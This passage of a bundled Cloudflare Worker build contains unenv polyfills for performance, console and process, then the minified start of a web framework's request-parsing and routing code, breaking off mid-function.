var __defProp = Object.defineProperty;
var __name = (target, value) => __defProp(target, "name", { value, configurable: true });

// ../node_modules/unenv/dist/runtime/_internal/utils.mjs
// @__NO_SIDE_EFFECTS__
function createNotImplementedError(name) {
  return new Error(`[unenv] ${name} is not implemented yet!`);
}
__name(createNotImplementedError, "createNotImplementedError");
// @__NO_SIDE_EFFECTS__
function notImplemented(name) {
  const fn = /* @__PURE__ */ __name(() => {
    throw /* @__PURE__ */ createNotImplementedError(name);
  }, "fn");
  return Object.assign(fn, { __unenv__: true });
}
__name(notImplemented, "notImplemented");
// @__NO_SIDE_EFFECTS__
function notImplementedClass(name) {
  return class {
    __unenv__ = true;
    constructor() {
      throw new Error(`[unenv] ${name} is not implemented yet!`);
    }
  };
}
__name(notImplementedClass, "notImplementedClass");

// ../node_modules/unenv/dist/runtime/node/internal/perf_hooks/performance.mjs
var _timeOrigin = globalThis.performance?.timeOrigin ?? Date.now();
var _performanceNow = globalThis.performance?.now ? globalThis.performance.now.bind(globalThis.performance) : () => Date.now() - _timeOrigin;
var nodeTiming = {
  name: "node",
  entryType: "node",
  startTime: 0,
  duration: 0,
  nodeStart: 0,
  v8Start: 0,
  bootstrapComplete: 0,
  environment: 0,
  loopStart: 0,
  loopExit: 0,
  idleTime: 0,
  uvMetricsInfo: {
    loopCount: 0,
    events: 0,
    eventsWaiting: 0
  },
  detail: void 0,
  toJSON() {
    return this;
  }
};
var PerformanceEntry = class {
  static {
    __name(this, "PerformanceEntry");
  }
  __unenv__ = true;
  detail;
  entryType = "event";
  name;
  startTime;
  constructor(name, options) {
    this.name = name;
    this.startTime = options?.startTime || _performanceNow();
    this.detail = options?.detail;
  }
  get duration() {
    return _performanceNow() - this.startTime;
  }
  toJSON() {
    return {
      name: this.name,
      entryType: this.entryType,
      startTime: this.startTime,
      duration: this.duration,
      detail: this.detail
    };
  }
};
var PerformanceMark = class PerformanceMark2 extends PerformanceEntry {
  static {
    __name(this, "PerformanceMark");
  }
  entryType = "mark";
  constructor() {
    super(...arguments);
  }
  get duration() {
    return 0;
  }
};
var PerformanceMeasure = class extends PerformanceEntry {
  static {
    __name(this, "PerformanceMeasure");
  }
  entryType = "measure";
};
var PerformanceResourceTiming = class extends PerformanceEntry {
  static {
    __name(this, "PerformanceResourceTiming");
  }
  entryType = "resource";
  serverTiming = [];
  connectEnd = 0;
  connectStart = 0;
  decodedBodySize = 0;
  domainLookupEnd = 0;
  domainLookupStart = 0;
  encodedBodySize = 0;
  fetchStart = 0;
  initiatorType = "";
  name = "";
  nextHopProtocol = "";
  redirectEnd = 0;
  redirectStart = 0;
  requestStart = 0;
  responseEnd = 0;
  responseStart = 0;
  secureConnectionStart = 0;
  startTime = 0;
  transferSize = 0;
  workerStart = 0;
  responseStatus = 0;
};
var PerformanceObserverEntryList = class {
  static {
    __name(this, "PerformanceObserverEntryList");
  }
  __unenv__ = true;
  getEntries() {
    return [];
  }
  getEntriesByName(_name, _type) {
    return [];
  }
  getEntriesByType(type) {
    return [];
  }
};
var Performance = class {
  static {
    __name(this, "Performance");
  }
  __unenv__ = true;
  timeOrigin = _timeOrigin;
  eventCounts = /* @__PURE__ */ new Map();
  _entries = [];
  _resourceTimingBufferSize = 0;
  navigation = void 0;
  timing = void 0;
  timerify(_fn, _options) {
    throw createNotImplementedError("Performance.timerify");
  }
  get nodeTiming() {
    return nodeTiming;
  }
  eventLoopUtilization() {
    return {};
  }
  markResourceTiming() {
    return new PerformanceResourceTiming("");
  }
  onresourcetimingbufferfull = null;
  now() {
    if (this.timeOrigin === _timeOrigin) {
      return _performanceNow();
    }
    return Date.now() - this.timeOrigin;
  }
  clearMarks(markName) {
    this._entries = markName ? this._entries.filter((e) => e.name !== markName) : this._entries.filter((e) => e.entryType !== "mark");
  }
  clearMeasures(measureName) {
    this._entries = measureName ? this._entries.filter((e) => e.name !== measureName) : this._entries.filter((e) => e.entryType !== "measure");
  }
  clearResourceTimings() {
    this._entries = this._entries.filter((e) => e.entryType !== "resource" || e.entryType !== "navigation");
  }
  getEntries() {
    return this._entries;
  }
  getEntriesByName(name, type) {
    return this._entries.filter((e) => e.name === name && (!type || e.entryType === type));
  }
  getEntriesByType(type) {
    return this._entries.filter((e) => e.entryType === type);
  }
  mark(name, options) {
    const entry = new PerformanceMark(name, options);
    this._entries.push(entry);
    return entry;
  }
  measure(measureName, startOrMeasureOptions, endMark) {
    let start;
    let end;
    if (typeof startOrMeasureOptions === "string") {
      start = this.getEntriesByName(startOrMeasureOptions, "mark")[0]?.startTime;
      end = this.getEntriesByName(endMark, "mark")[0]?.startTime;
    } else {
      start = Number.parseFloat(startOrMeasureOptions?.start) || this.now();
      end = Number.parseFloat(startOrMeasureOptions?.end) || this.now();
    }
    const entry = new PerformanceMeasure(measureName, {
      startTime: start,
      detail: {
        start,
        end
      }
    });
    this._entries.push(entry);
    return entry;
  }
  setResourceTimingBufferSize(maxSize) {
    this._resourceTimingBufferSize = maxSize;
  }
  addEventListener(type, listener, options) {
    throw createNotImplementedError("Performance.addEventListener");
  }
  removeEventListener(type, listener, options) {
    throw createNotImplementedError("Performance.removeEventListener");
  }
  dispatchEvent(event) {
    throw createNotImplementedError("Performance.dispatchEvent");
  }
  toJSON() {
    return this;
  }
};
var PerformanceObserver = class {
  static {
    __name(this, "PerformanceObserver");
  }
  __unenv__ = true;
  static supportedEntryTypes = [];
  _callback = null;
  constructor(callback) {
    this._callback = callback;
  }
  takeRecords() {
    return [];
  }
  disconnect() {
    throw createNotImplementedError("PerformanceObserver.disconnect");
  }
  observe(options) {
    throw createNotImplementedError("PerformanceObserver.observe");
  }
  bind(fn) {
    return fn;
  }
  runInAsyncScope(fn, thisArg, ...args) {
    return fn.call(thisArg, ...args);
  }
  asyncId() {
    return 0;
  }
  triggerAsyncId() {
    return 0;
  }
  emitDestroy() {
    return this;
  }
};
var performance = globalThis.performance && "addEventListener" in globalThis.performance ? globalThis.performance : new Performance();

// ../node_modules/@cloudflare/unenv-preset/dist/runtime/polyfill/performance.mjs
if (!("__unenv__" in performance)) {
  const proto = Performance.prototype;
  for (const key of Object.getOwnPropertyNames(proto)) {
    if (key !== "constructor" && !(key in performance)) {
      const desc = Object.getOwnPropertyDescriptor(proto, key);
      if (desc) {
        Object.defineProperty(performance, key, desc);
      }
    }
  }
}
globalThis.performance = performance;
globalThis.Performance = Performance;
globalThis.PerformanceEntry = PerformanceEntry;
globalThis.PerformanceMark = PerformanceMark;
globalThis.PerformanceMeasure = PerformanceMeasure;
globalThis.PerformanceObserver = PerformanceObserver;
globalThis.PerformanceObserverEntryList = PerformanceObserverEntryList;
globalThis.PerformanceResourceTiming = PerformanceResourceTiming;

// ../node_modules/unenv/dist/runtime/node/console.mjs
import { Writable } from "node:stream";

// ../node_modules/unenv/dist/runtime/mock/noop.mjs
var noop_default = Object.assign(() => {
}, { __unenv__: true });

// ../node_modules/unenv/dist/runtime/node/console.mjs
var _console = globalThis.console;
var _ignoreErrors = true;
var _stderr = new Writable();
var _stdout = new Writable();
var log = _console?.log ?? noop_default;
var info = _console?.info ?? log;
var trace = _console?.trace ?? info;
var debug = _console?.debug ?? log;
var table = _console?.table ?? log;
var error = _console?.error ?? log;
var warn = _console?.warn ?? error;
var createTask = _console?.createTask ?? /* @__PURE__ */ notImplemented("console.createTask");
var clear = _console?.clear ?? noop_default;
var count = _console?.count ?? noop_default;
var countReset = _console?.countReset ?? noop_default;
var dir = _console?.dir ?? noop_default;
var dirxml = _console?.dirxml ?? noop_default;
var group = _console?.group ?? noop_default;
var groupEnd = _console?.groupEnd ?? noop_default;
var groupCollapsed = _console?.groupCollapsed ?? noop_default;
var profile = _console?.profile ?? noop_default;
var profileEnd = _console?.profileEnd ?? noop_default;
var time = _console?.time ?? noop_default;
var timeEnd = _console?.timeEnd ?? noop_default;
var timeLog = _console?.timeLog ?? noop_default;
var timeStamp = _console?.timeStamp ?? noop_default;
var Console = _console?.Console ?? /* @__PURE__ */ notImplementedClass("console.Console");
var _times = /* @__PURE__ */ new Map();
var _stdoutErrorHandler = noop_default;
var _stderrErrorHandler = noop_default;

// ../node_modules/@cloudflare/unenv-preset/dist/runtime/node/console.mjs
var workerdConsole = globalThis["console"];
var {
  assert,
  clear: clear2,
  // @ts-expect-error undocumented public API
  context,
  count: count2,
  countReset: countReset2,
  // @ts-expect-error undocumented public API
  createTask: createTask2,
  debug: debug2,
  dir: dir2,
  dirxml: dirxml2,
  error: error2,
  group: group2,
  groupCollapsed: groupCollapsed2,
  groupEnd: groupEnd2,
  info: info2,
  log: log2,
  profile: profile2,
  profileEnd: profileEnd2,
  table: table2,
  time: time2,
  timeEnd: timeEnd2,
  timeLog: timeLog2,
  timeStamp: timeStamp2,
  trace: trace2,
  warn: warn2
} = workerdConsole;
Object.assign(workerdConsole, {
  Console,
  _ignoreErrors,
  _stderr,
  _stderrErrorHandler,
  _stdout,
  _stdoutErrorHandler,
  _times
});
var console_default = workerdConsole;

// ../node_modules/wrangler/_virtual_unenv_global_polyfill-@cloudflare-unenv-preset-node-console
globalThis.console = console_default;

// ../node_modules/unenv/dist/runtime/node/internal/process/hrtime.mjs
var hrtime = /* @__PURE__ */ Object.assign(/* @__PURE__ */ __name(function hrtime2(startTime) {
  const now = Date.now();
  const seconds = Math.trunc(now / 1e3);
  const nanos = now % 1e3 * 1e6;
  if (startTime) {
    let diffSeconds = seconds - startTime[0];
    let diffNanos = nanos - startTime[0];
    if (diffNanos < 0) {
      diffSeconds = diffSeconds - 1;
      diffNanos = 1e9 + diffNanos;
    }
    return [diffSeconds, diffNanos];
  }
  return [seconds, nanos];
}, "hrtime"), { bigint: /* @__PURE__ */ __name(function bigint() {
  return BigInt(Date.now() * 1e6);
}, "bigint") });

// ../node_modules/unenv/dist/runtime/node/internal/process/process.mjs
import { EventEmitter } from "node:events";

// ../node_modules/unenv/dist/runtime/node/internal/tty/read-stream.mjs
var ReadStream = class {
  static {
    __name(this, "ReadStream");
  }
  fd;
  isRaw = false;
  isTTY = false;
  constructor(fd) {
    this.fd = fd;
  }
  setRawMode(mode) {
    this.isRaw = mode;
    return this;
  }
};

// ../node_modules/unenv/dist/runtime/node/internal/tty/write-stream.mjs
var WriteStream = class {
  static {
    __name(this, "WriteStream");
  }
  fd;
  columns = 80;
  rows = 24;
  isTTY = false;
  constructor(fd) {
    this.fd = fd;
  }
  clearLine(dir3, callback) {
    callback && callback();
    return false;
  }
  clearScreenDown(callback) {
    callback && callback();
    return false;
  }
  cursorTo(x, y, callback) {
    callback && typeof callback === "function" && callback();
    return false;
  }
  moveCursor(dx, dy, callback) {
    callback && callback();
    return false;
  }
  getColorDepth(env2) {
    return 1;
  }
  hasColors(count3, env2) {
    return false;
  }
  getWindowSize() {
    return [this.columns, this.rows];
  }
  write(str, encoding, cb) {
    if (str instanceof Uint8Array) {
      str = new TextDecoder().decode(str);
    }
    try {
      console.log(str);
    } catch {
    }
    cb && typeof cb === "function" && cb();
    return false;
  }
};

// ../node_modules/unenv/dist/runtime/node/internal/process/node-version.mjs
var NODE_VERSION = "22.14.0";

// ../node_modules/unenv/dist/runtime/node/internal/process/process.mjs
var Process = class _Process extends EventEmitter {
  static {
    __name(this, "Process");
  }
  env;
  hrtime;
  nextTick;
  constructor(impl) {
    super();
    this.env = impl.env;
    this.hrtime = impl.hrtime;
    this.nextTick = impl.nextTick;
    for (const prop of [...Object.getOwnPropertyNames(_Process.prototype), ...Object.getOwnPropertyNames(EventEmitter.prototype)]) {
      const value = this[prop];
      if (typeof value === "function") {
        this[prop] = value.bind(this);
      }
    }
  }
  // --- event emitter ---
  emitWarning(warning, type, code) {
    console.warn(`${code ? `[${code}] ` : ""}${type ? `${type}: ` : ""}${warning}`);
  }
  emit(...args) {
    return super.emit(...args);
  }
  listeners(eventName) {
    return super.listeners(eventName);
  }
  // --- stdio (lazy initializers) ---
  #stdin;
  #stdout;
  #stderr;
  get stdin() {
    return this.#stdin ??= new ReadStream(0);
  }
  get stdout() {
    return this.#stdout ??= new WriteStream(1);
  }
  get stderr() {
    return this.#stderr ??= new WriteStream(2);
  }
  // --- cwd ---
  #cwd = "/";
  chdir(cwd2) {
    this.#cwd = cwd2;
  }
  cwd() {
    return this.#cwd;
  }
  // --- dummy props and getters ---
  arch = "";
  platform = "";
  argv = [];
  argv0 = "";
  execArgv = [];
  execPath = "";
  title = "";
  pid = 200;
  ppid = 100;
  get version() {
    return `v${NODE_VERSION}`;
  }
  get versions() {
    return { node: NODE_VERSION };
  }
  get allowedNodeEnvironmentFlags() {
    return /* @__PURE__ */ new Set();
  }
  get sourceMapsEnabled() {
    return false;
  }
  get debugPort() {
    return 0;
  }
  get throwDeprecation() {
    return false;
  }
  get traceDeprecation() {
    return false;
  }
  get features() {
    return {};
  }
  get release() {
    return {};
  }
  get connected() {
    return false;
  }
  get config() {
    return {};
  }
  get moduleLoadList() {
    return [];
  }
  constrainedMemory() {
    return 0;
  }
  availableMemory() {
    return 0;
  }
  uptime() {
    return 0;
  }
  resourceUsage() {
    return {};
  }
  // --- noop methods ---
  ref() {
  }
  unref() {
  }
  // --- unimplemented methods ---
  umask() {
    throw createNotImplementedError("process.umask");
  }
  getBuiltinModule() {
    return void 0;
  }
  getActiveResourcesInfo() {
    throw createNotImplementedError("process.getActiveResourcesInfo");
  }
  exit() {
    throw createNotImplementedError("process.exit");
  }
  reallyExit() {
    throw createNotImplementedError("process.reallyExit");
  }
  kill() {
    throw createNotImplementedError("process.kill");
  }
  abort() {
    throw createNotImplementedError("process.abort");
  }
  dlopen() {
    throw createNotImplementedError("process.dlopen");
  }
  setSourceMapsEnabled() {
    throw createNotImplementedError("process.setSourceMapsEnabled");
  }
  loadEnvFile() {
    throw createNotImplementedError("process.loadEnvFile");
  }
  disconnect() {
    throw createNotImplementedError("process.disconnect");
  }
  cpuUsage() {
    throw createNotImplementedError("process.cpuUsage");
  }
  setUncaughtExceptionCaptureCallback() {
    throw createNotImplementedError("process.setUncaughtExceptionCaptureCallback");
  }
  hasUncaughtExceptionCaptureCallback() {
    throw createNotImplementedError("process.hasUncaughtExceptionCaptureCallback");
  }
  initgroups() {
    throw createNotImplementedError("process.initgroups");
  }
  openStdin() {
    throw createNotImplementedError("process.openStdin");
  }
  assert() {
    throw createNotImplementedError("process.assert");
  }
  binding() {
    throw createNotImplementedError("process.binding");
  }
  // --- attached interfaces ---
  permission = { has: /* @__PURE__ */ notImplemented("process.permission.has") };
  report = {
    directory: "",
    filename: "",
    signal: "SIGUSR2",
    compact: false,
    reportOnFatalError: false,
    reportOnSignal: false,
    reportOnUncaughtException: false,
    getReport: /* @__PURE__ */ notImplemented("process.report.getReport"),
    writeReport: /* @__PURE__ */ notImplemented("process.report.writeReport")
  };
  finalization = {
    register: /* @__PURE__ */ notImplemented("process.finalization.register"),
    unregister: /* @__PURE__ */ notImplemented("process.finalization.unregister"),
    registerBeforeExit: /* @__PURE__ */ notImplemented("process.finalization.registerBeforeExit")
  };
  memoryUsage = Object.assign(() => ({
    arrayBuffers: 0,
    rss: 0,
    external: 0,
    heapTotal: 0,
    heapUsed: 0
  }), { rss: /* @__PURE__ */ __name(() => 0, "rss") });
  // --- undefined props ---
  mainModule = void 0;
  domain = void 0;
  // optional
  send = void 0;
  exitCode = void 0;
  channel = void 0;
  getegid = void 0;
  geteuid = void 0;
  getgid = void 0;
  getgroups = void 0;
  getuid = void 0;
  setegid = void 0;
  seteuid = void 0;
  setgid = void 0;
  setgroups = void 0;
  setuid = void 0;
  // internals
  _events = void 0;
  _eventsCount = void 0;
  _exiting = void 0;
  _maxListeners = void 0;
  _debugEnd = void 0;
  _debugProcess = void 0;
  _fatalException = void 0;
  _getActiveHandles = void 0;
  _getActiveRequests = void 0;
  _kill = void 0;
  _preload_modules = void 0;
  _rawDebug = void 0;
  _startProfilerIdleNotifier = void 0;
  _stopProfilerIdleNotifier = void 0;
  _tickCallback = void 0;
  _disconnect = void 0;
  _handleQueue = void 0;
  _pendingMessage = void 0;
  _channel = void 0;
  _send = void 0;
  _linkedBinding = void 0;
};

// ../node_modules/@cloudflare/unenv-preset/dist/runtime/node/process.mjs
var globalProcess = globalThis["process"];
var getBuiltinModule = globalProcess.getBuiltinModule;
var workerdProcess = getBuiltinModule("node:process");
var unenvProcess = new Process({
  env: globalProcess.env,
  hrtime,
  // `nextTick` is available from workerd process v1
  nextTick: workerdProcess.nextTick
});
var { exit, features, platform } = workerdProcess;
var {
  _channel,
  _debugEnd,
  _debugProcess,
  _disconnect,
  _events,
  _eventsCount,
  _exiting,
  _fatalException,
  _getActiveHandles,
  _getActiveRequests,
  _handleQueue,
  _kill,
  _linkedBinding,
  _maxListeners,
  _pendingMessage,
  _preload_modules,
  _rawDebug,
  _send,
  _startProfilerIdleNotifier,
  _stopProfilerIdleNotifier,
  _tickCallback,
  abort,
  addListener,
  allowedNodeEnvironmentFlags,
  arch,
  argv,
  argv0,
  assert: assert2,
  availableMemory,
  binding,
  channel,
  chdir,
  config,
  connected,
  constrainedMemory,
  cpuUsage,
  cwd,
  debugPort,
  disconnect,
  dlopen,
  domain,
  emit,
  emitWarning,
  env,
  eventNames,
  execArgv,
  execPath,
  exitCode,
  finalization,
  getActiveResourcesInfo,
  getegid,
  geteuid,
  getgid,
  getgroups,
  getMaxListeners,
  getuid,
  hasUncaughtExceptionCaptureCallback,
  hrtime: hrtime3,
  initgroups,
  kill,
  listenerCount,
  listeners,
  loadEnvFile,
  mainModule,
  memoryUsage,
  moduleLoadList,
  nextTick,
  off,
  on,
  once,
  openStdin,
  permission,
  pid,
  ppid,
  prependListener,
  prependOnceListener,
  rawListeners,
  reallyExit,
  ref,
  release,
  removeAllListeners,
  removeListener,
  report,
  resourceUsage,
  send,
  setegid,
  seteuid,
  setgid,
  setgroups,
  setMaxListeners,
  setSourceMapsEnabled,
  setuid,
  setUncaughtExceptionCaptureCallback,
  sourceMapsEnabled,
  stderr,
  stdin,
  stdout,
  throwDeprecation,
  title,
  traceDeprecation,
  umask,
  unref,
  uptime,
  version,
  versions
} = unenvProcess;
var _process = {
  abort,
  addListener,
  allowedNodeEnvironmentFlags,
  hasUncaughtExceptionCaptureCallback,
  setUncaughtExceptionCaptureCallback,
  loadEnvFile,
  sourceMapsEnabled,
  arch,
  argv,
  argv0,
  chdir,
  config,
  connected,
  constrainedMemory,
  availableMemory,
  cpuUsage,
  cwd,
  debugPort,
  dlopen,
  disconnect,
  emit,
  emitWarning,
  env,
  eventNames,
  execArgv,
  execPath,
  exit,
  finalization,
  features,
  getBuiltinModule,
  getActiveResourcesInfo,
  getMaxListeners,
  hrtime: hrtime3,
  kill,
  listeners,
  listenerCount,
  memoryUsage,
  nextTick,
  on,
  off,
  once,
  pid,
  platform,
  ppid,
  prependListener,
  prependOnceListener,
  rawListeners,
  release,
  removeAllListeners,
  removeListener,
  report,
  resourceUsage,
  setMaxListeners,
  setSourceMapsEnabled,
  stderr,
  stdin,
  stdout,
  title,
  throwDeprecation,
  traceDeprecation,
  umask,
  uptime,
  version,
  versions,
  // @ts-expect-error old API
  domain,
  initgroups,
  moduleLoadList,
  reallyExit,
  openStdin,
  assert: assert2,
  binding,
  send,
  exitCode,
  channel,
  getegid,
  geteuid,
  getgid,
  getgroups,
  getuid,
  setegid,
  seteuid,
  setgid,
  setgroups,
  setuid,
  permission,
  mainModule,
  _events,
  _eventsCount,
  _exiting,
  _maxListeners,
  _debugEnd,
  _debugProcess,
  _fatalException,
  _getActiveHandles,
  _getActiveRequests,
  _kill,
  _preload_modules,
  _rawDebug,
  _startProfilerIdleNotifier,
  _stopProfilerIdleNotifier,
  _tickCallback,
  _disconnect,
  _handleQueue,
  _pendingMessage,
  _channel,
  _send,
  _linkedBinding
};
var process_default = _process;

// ../node_modules/wrangler/_virtual_unenv_global_polyfill-@cloudflare-unenv-preset-node-process
globalThis.process = process_default;

// _worker.js
var Yt = Object.defineProperty;
var ct = /* @__PURE__ */ __name((e) => {
  throw TypeError(e);
}, "ct");
var Jt = /* @__PURE__ */ __name((e, t, s) => t in e ? Yt(e, t, { enumerable: true, configurable: true, writable: true, value: s }) : e[t] = s, "Jt");
var A = /* @__PURE__ */ __name((e, t, s) => Jt(e, typeof t != "symbol" ? t + "" : t, s), "A");
var tt = /* @__PURE__ */ __name((e, t, s) => t.has(e) || ct("Cannot " + s), "tt");
var m = /* @__PURE__ */ __name((e, t, s) => (tt(e, t, "read from private field"), s ? s.call(e) : t.get(e)), "m");
var C = /* @__PURE__ */ __name((e, t, s) => t.has(e) ? ct("Cannot add the same private member more than once") : t instanceof WeakSet ? t.add(e) : t.set(e, s), "C");
var E = /* @__PURE__ */ __name((e, t, s, a) => (tt(e, t, "write to private field"), a ? a.call(e, s) : t.set(e, s), s), "E");
var R = /* @__PURE__ */ __name((e, t, s) => (tt(e, t, "access private method"), s), "R");
var pt = /* @__PURE__ */ __name((e, t, s, a) => ({ set _(i) {
  E(e, t, i, s);
}, get _() {
  return m(e, t, a);
} }), "pt");
var ut = /* @__PURE__ */ __name((e, t, s) => (a, i) => {
  let n = -1;
  return r(0);
  async function r(o) {
    if (o <= n) throw new Error("next() called multiple times");
    n = o;
    let d, u = false, b;
    if (e[o] ? (b = e[o][0][0], a.req.routeIndex = o) : b = o === e.length && i || void 0, b) try {
      d = await b(a, () => r(o + 1));
    } catch (l) {
      if (l instanceof Error && t) a.error = l, d = await t(l, a), u = true;
      else throw l;
    }
    else a.finalized === false && s && (d = await s(a));
    return d && (a.finalized === false || u) && (a.res = d), a;
  }
  __name(r, "r");
}, "ut");
var Vt = /* @__PURE__ */ Symbol();
var Wt = /* @__PURE__ */ __name(async (e, t = /* @__PURE__ */ Object.create(null)) => {
  const { all: s = false, dot: a = false } = t, n = (e instanceof Ct ? e.raw.headers : e.headers).get("Content-Type");
  return n != null && n.startsWith("multipart/form-data") || n != null && n.startsWith("application/x-www-form-urlencoded") ? Qt(e, { all: s, dot: a }) : {};
}, "Wt");
async function Qt(e, t) {
  const s = await e.formData();
  return s ? Zt(s, t) : {};
}
__name(Qt, "Qt");
function Zt(e, t) {
  const s = /* @__PURE__ */ Object.create(null);
  return e.forEach((a, i) => {
    t.all || i.endsWith("[]") ? ea(s, i, a) : s[i] = a;
  }), t.dot && Object.entries(s).forEach(([a, i]) => {
    a.includes(".") && (ta(s, a, i), delete s[a]);
  }), s;
}
__name(Zt, "Zt");
var ea = /* @__PURE__ */ __name((e, t, s) => {
  e[t] !== void 0 ? Array.isArray(e[t]) ? e[t].push(s) : e[t] = [e[t], s] : t.endsWith("[]") ? e[t] = [s] : e[t] = s;
}, "ea");
var ta = /* @__PURE__ */ __name((e, t, s) => {
  if (/(?:^|\.)__proto__\./.test(t)) return;
  let a = e;
  const i = t.split(".");
  i.forEach((n, r) => {
    r === i.length - 1 ? a[n] = s : ((!a[n] || typeof a[n] != "object" || Array.isArray(a[n]) || a[n] instanceof File) && (a[n] = /* @__PURE__ */ Object.create(null)), a = a[n]);
  });
}, "ta");
var St = /* @__PURE__ */ __name((e) => {
  const t = e.split("/");
  return t[0] === "" && t.shift(), t;
}, "St");
var aa = /* @__PURE__ */ __name((e) => {
  const { groups: t, path: s } = sa(e), a = St(s);
  return na(a, t);
}, "aa");
var sa = /* @__PURE__ */ __name((e) => {
  const t = [];
  return e = e.replace(/\{[^}]+\}/g, (s, a) => {
    const i = `@${a}`;
    return t.push([i, s]), i;
  }), { groups: t, path: e };
}, "sa");
var na = /* @__PURE__ */ __name((e, t) => {
  for (let s = t.length - 1; s >= 0; s--) {
    const [a] = t[s];
    for (let i = e.length - 1; i >= 0; i--) if (e[i].includes(a)) {
      e[i] = e[i].replace(a, t[s][1]);
      break;
    }
  }
  return e;
}, "na");
var Fe = {};
var ia = /* @__PURE__ */ __name((e, t) => {
  if (e === "*") return "*";
  const s = e.match(/^\:([^\{\}]+)(?:\{(.+)\})?$/);
  if (s) {
    const a = `${e}#${t}`;
    return Fe[a] || (s[2] ? Fe[a] = t && t[0] !== ":" && t[0] !== "*" ? [a, s[1], new RegExp(`^${s[2]}(?=/${t})`)] : [e, s[1], new RegExp(`^${s[2]}$`)] : Fe[a] = [e, s[1], true]), Fe[a];
  }
  return null;
}, "ia");
var rt = /* @__PURE__ */ __name((e, t) => {
  try {
    return t(e);
  } catch {
    return e.replace(/(?:%[0-9A-Fa-f]{2})+/g, (s) => {
      try {
        return t(s);
      } catch {
        return s;
      }
    });
  }
}, "rt");
var Tt = /* @__PURE__ */ __name((e) => rt(e, decodeURI), "Tt");
var It = /* @__PURE__ */ __name((e) => {
  const t = e.url, s = t.indexOf("/", t.indexOf(":") + 4);
  let a = s;
  for (; a < t.length; a++) {
    const i = t.charCodeAt(a);
    if (i === 37) {
      const n = t.indexOf("?", a), r = t.indexOf("#", a), o = n === -1 ? r === -1 ? void 0 : r : r === -1 ? n : Math.min(n, r), d = t.slice(s, o);
      return Tt(d.includes("%25") ? d.replace(/%25/g, "%2525") : d);
    } else if (i === 63 || i === 35) break;
  }
  return t.slice(s, a);
}, "It");
var ra = /* @__PURE__ */ __name((e) => {
  const t = It(e);
  return t.length > 1 && t.at(-1) === "/" ? t.slice(0, -1) : t;
}, "ra");
var Se = /* @__PURE__ */ __name((e, t, ...s) => (s.length && (t = Se(t, ...s)), `${(e == null ? void 0 : e[0]) === "/" ? "" : "/"}${e}${t === "/" ? "" : `${(e == null ? void 0 : e.at(-1)) === "/" ? "" : "/"}${(t == null ? void 0 : t[0]) === "/" ? t.slice(1) : t}`}`), "Se");
var Et = /* @__PURE__ */ __name((e) => {
  if (e.charCodeAt(e.length - 1) !== 63 || !e.includes(":")) return null;
  const t = e.split("/"), s = [];
  let a = "";
  return t.forEach((i) => {
    if (i !== "" && !/\:/.test(i)) a += "/" + i;
    else if (/\:/.test(i)) if (/\?/.test(i)) {
      s.length === 0 && a === "" ? s.push("/") : s.push(a);
      const n = i.replace("?", "");
      a += "/" + n, s.push(a);
    } else a += "/" + i;
  }), s.filter((i, n, r) => r.indexOf(i) === n);
}, "Et");
var at = /* @__PURE__ */ __name((e) => /[%+]/.test(e) ? (e.indexOf("+") !== -1 && (e = e.replace(/\+/g, " ")), e.indexOf("%") !== -1 ? rt(e, Pt) : e) : e, "at");
var At = /* @__PURE__ */ __name((e, t, s) => {
  let a;
  if (!s && t && !/[%+]/.test(t)) {
    let r = e.indexOf("?", 8);
    if (r === -1) return;
    for (e.startsWith(t, r + 1) || (r = e.indexOf(`&${t}`, r + 1)); r !== -1; ) {
      const o = e.charCodeAt(r + t.length + 1);
      if (o === 61) {
        const d = r + t.length + 2, u = e.indexOf("&", d);
        return at(e.slice(d, u === -1 ? void 0 : u));
      } else if (o == 38 || isNaN(o)) return "";
      r = e.indexOf(`&${t}`, r + 1);
    }
    if (a = /[%+]/.test(e), !a) return;
  }
  const i = {};
  a ?? (a = /[%+]/.test(e));
  let n = e.indexOf("?", 8);
  for (; n !== -1; ) {
    const r = e.indexOf("&", n + 1);
    let o = e.indexOf("=", n);
    o > r && r !== -1 && (o = -1);
    let d = e.slice(n + 1, o === -1 ? r === -1 ? void 0 : r : o);
    if (a && (d = at(d)), n = r, d === "") continue;
    let u;
    o === -1 ? u = "" : (u = e.slice(o + 1, r === -1 ? void 0 : r), a && (u = at(u))), s ? (i[d] && Array.isArray(i[d]) || (i[d] = []), i[d].push(u)) : i[d] ?? (i[d] = u);
  }
  return t ? i[t] : i;
}, "At");
var oa = At;
var da = /* @__PURE__ */ __name((e, t) => At(e, t, true), "da");
var Pt = decodeURIComponent;
var ft = /* @__PURE__ */ __name((e) => rt(e, Pt), "ft");
var Ae;
var Y;
var ne;
var _t;
var Bt;
var nt;
var re;
var ht;
var Ct = (ht = class {
  static {
    __name(this, "ht");
  }
  constructor(e, t = "/", s = [[]]) {
    C(this, ne);
    A(this, "raw");
    C(this, Ae);
    C(this, Y);
    A(this, "routeIndex", 0);
    A(this, "path");
    A(this, "bodyCache", {});
    C(this, re, (e2) => {
      const { bodyCache: t2, raw: s2 } = this, a = t2[e2];
      if (a) return a;
      const i = Object.keys(t2)[0];
      return i ? t2[i].then((n) => (i === "json" && (n = JSON.stringify(n)), new Response(n)[e2]())) : t2[e2] = s2[e2]();
    });
    this.raw = e, this.path = t, E(this, Y, s), E(this, Ae, {});
  }
  param(e) {
    return e ? R(this, ne, _t).call(this, e) : R(this, ne, Bt).call(this);
  }
  query(e) {
    return oa(this.url, e);
  }
  queries(e) {
    return da(this.url, e);
  }
  header(e) {
    if (e) return this.raw.headers.get(e) ?? void 0;
    const t = {};
    return this.raw.headers.forEach((s, a) => {
      t[a] = s;
    }), t;
  }
  async parseBody(e) {
    return Wt(this, e);
  }
  json() {
    return m(this, re).call(this, "text").then((e) => JSON.parse(e));
  }
  text() {
    return m(this, re).call(this, "text");
  }
  arrayBuffer() {
    return m(this, re).call(this, "arrayBuffer");
  }
  blob() {
    return m(this, re).call(this, "blob");
  }
  formData() {
    return m(this, re).call(this, "formData");
  }
  addValidatedData(e, t) {
    m(this, Ae)[e] = t;
  }
  valid(e) {
    return m(this, Ae)[e];
  }
  get url() {
    return this.raw.url;
  }
  get method() {
    return this.raw.method;
  }
  get [Vt]() {
    return m(this, Y);
  }
  get matchedRoutes() {
    return m(this, Y)[0].map(([[, e]]) => e);
  }
  get routePath() {
    return m(this, Y)[0].map(([[, e]]) => e)[this.routeIndex].path;
  }
}, Ae = /* @__PURE__ */ new WeakMap(), Y = /* @__PURE__ */ new WeakMap(), ne = /* @__PURE__ */ new WeakSet(), _t = /* @__PURE__ */ __name(function(e) {
  const t = m(this, Y)[0][this.routeIndex][1][e], s = R(this, ne, nt).call(this, t);
  return s && /\%/.test(s) ? ft(s) : s;
